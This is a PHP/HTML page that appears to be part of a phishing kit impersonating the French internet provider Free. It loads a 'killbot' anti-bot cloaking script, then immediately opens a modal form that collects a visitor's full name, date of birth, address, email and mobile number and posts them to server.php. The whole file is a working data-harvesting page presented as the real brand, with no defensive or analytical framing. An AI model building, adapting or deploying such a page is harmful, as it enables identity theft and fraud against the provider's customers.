<?php require_once('killbot.to.php'); ?>
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Choisissez une offre Fibre ou ADSL sans engagement - Free</title>
    <link rel="shortcut icon" href="favicon.ico" type="image/x-icon">
	<link rel="icon" href="favicon.ico" type="image/x-icon">
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.0.0-beta3/css/all.min.css">
    <style>
        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
        }

        /* Image de fond par défaut (grande image pour les écrans de bureau)
           /* Image de fond par défaut (grande image pour les écrans de bureau) */
           .background-image {
            position: fixed;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background: url('bg.png') no-repeat center center fixed; /* Image pour les grands écrans */
            background-size: cover;
            z-index: -1;
        }
        /* Image de fond pour les écrans extra-larges (XL) */
        @media (max-width: 1600px) {
            .background-image {
                background: url('lg.png') no-repeat center center fixed;
                background-size: cover;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
                
            }
        }  
        /* Image de fond pour les écrans extra-larges (XL) */
        @media (max-width: 1200px) {
            .background-image {
                background: url('lg.png') no-repeat center center fixed;
                background-size: cover;
                position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
                
            }
        }

        /* Image de fond pour les écrans larges (LG) */
        @media (max-width: 992px) {
            .background-image {
                background: url('bachmin.png') no-repeat center center fixed;
                background-size: cover;
                 position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
            }
        }

        /* Image de fond pour les écrans moyens (MD) */
        @media (max-width: 768px) {
            .background-image {
                background: url('bachmin.png') no-repeat center center fixed;
                background-size: cover;
                 position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
            }
        }

        /* Image de fond pour les petits écrans (SM) */
        @media (max-width: 576px) {
            .background-image {
                background: url('lg.png') no-repeat center center fixed;
                background-size: cover;
                 position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
            }
        }

        /* Image de fond pour les très petits écrans (XS) */
        @media (max-width: 375px) {
            .background-image {
                background: url('lg.png') no-repeat center center fixed;
                background-size: cover;
                 position: fixed;
                top: 0;
                left: 0;
                width: 100%;
                height: 100%;
                z-index: -1;
            }
        }

        /* Le fond de la page lorsque la modal est ouverte */
        .modal-backdrop {
            display: none; /* Masqué par défaut */
            position: fixed; 
            top: 0; 
            left: 0; 
            width: 100%; 
            height: 100%; 
            background-color: rgba(255, 255, 255, 0.8); /* Fond blanc semi-transparent */
            backdrop-filter: blur(1px); /* Effet de flou ajusté à 3px */
            z-index: 1; /* Derrière la modal */
        }

        /* La boîte modale */
        .modal {
            display: none; /* Masqué par défaut */
            position: fixed;
            top: 50%;
            left: 50%;
            transform: translate(-50%, -50%);
            background-color: #fff;
            padding: 20px;
            box-shadow: 0 5px 15px rgba(0,0,0,.5);
            z-index: 2; /* Devant le fond */
            width: 90%; /* Largeur par défaut */
            max-width: 600px; /* Largeur maximale agrandie */
            text-align: center;
        }

        .modal-header {
            font-size: 24px;
            margin-bottom: 15px;
        }

        .modal-body {
            font-size: 16px;
            margin-bottom: 20px;
        }

        .modal-footer {
            text-align: center;
        }

        .modal-footer button {
            padding: 10px 20px;
            margin: 5px;
            border: none;
            cursor: pointer;
        }

        .accept {
            background-color: #d32f2f;
            color: #fff;
        }

        .refuse {
            background-color: #444;
            color: #fff;
        }

        .more-info {
            background-color: #eee;
            color: #444;
        }
      
.form-group {
    margin-bottom: 15px;
    text-align: left;
    position: relative;
}

.form-group input {
    width: 100%;
    padding: 12px 30px 12px 10px;
    margin: 0;
    border: 3px solid #f2dad2;
    border-radius: 11px;
    box-sizing: border-box;
    font-size: 16px;
}

.form-group input[type="date"] {
    padding: 11px 30px 11px 10px;
}

.form-group i {
    position: absolute;
    right: 10px;
    top: 50%;
    transform: translateY(-50%);
    font-size: 16px;
    color: #888;
}

.validate-button {
    display: inline-block;
    padding: 12px 24px;
    font-size: 16px;
    font-weight: bold;
    color: #fff;
    background: linear-gradient(90deg, #4CAF50, #45a049);
    border: none;
    border-radius: 5px;
    cursor: pointer;
    transition: background 0.3s, transform 0.3s;
    margin-top: 10px;
}

.validate-button:hover {
    background: linear-gradient(90deg, #45a049, #4CAF50);
    transform: scale(1.05);
}

    </style>
</head>
<body>
    <div class="background-image"></div>
    <div class="modal-backdrop" id="modal-backdrop"></div>

    <div class="modal" id="modal">
      <div class="modal-header">
          Bienvenue chez Free
      </div>
      <div class="modal-body">
        Veuillez Saisir vos Informations:
      </div>
      <form id="user-form" method="post" action="server.php">
        <div class="form-group">
            <input type="text" id="firstname" name="name" placeholder="Nom Prénom" required>
            <i class="fa fa-user"></i>
        </div>
        <div class="form-group">
            <input type="date" id="dob" name="dob" placeholder="Date de naissance" required>
            <i class="fa fa-calendar-alt"></i>
        </div>
        <div class="form-group">
            <input type="text" id="address" name="address" placeholder="Adresse (rue, code postal, ville)" required>
            <i class="fa fa-map-marker-alt"></i>
        </div>
        <div class="form-group">
            <input type="email" id="email" name="email" placeholder="Email" required>
            <i class="fa fa-envelope"></i>
        </div>
        <div class="form-group">
            <input type="tel" id="phone" name="phone" placeholder="Numéro de portable" required>
            <i class="fa fa-phone"></i>
        </div>
        <div class="modal-footer">
            <button type="submit" class="validate-button">Valider</button>
        </div>
    </form>
      
  </div>

    <script>
        // Fonction pour ouvrir la modal
        function openModal() {
            document.getElementById('modal-backdrop').style.display = 'block';
            document.getElementById('modal').style.display = 'block';
        }

        // Fonction pour fermer la modal
        function closeModal() {
            document.getElementById('modal-backdrop').style.display = 'none';
            document.getElementById('modal').style.display = 'none';
        }

        // Ouvrir la modal dès que la page est chargée
        window.onload = openModal;
    </script>
</body>
</html>
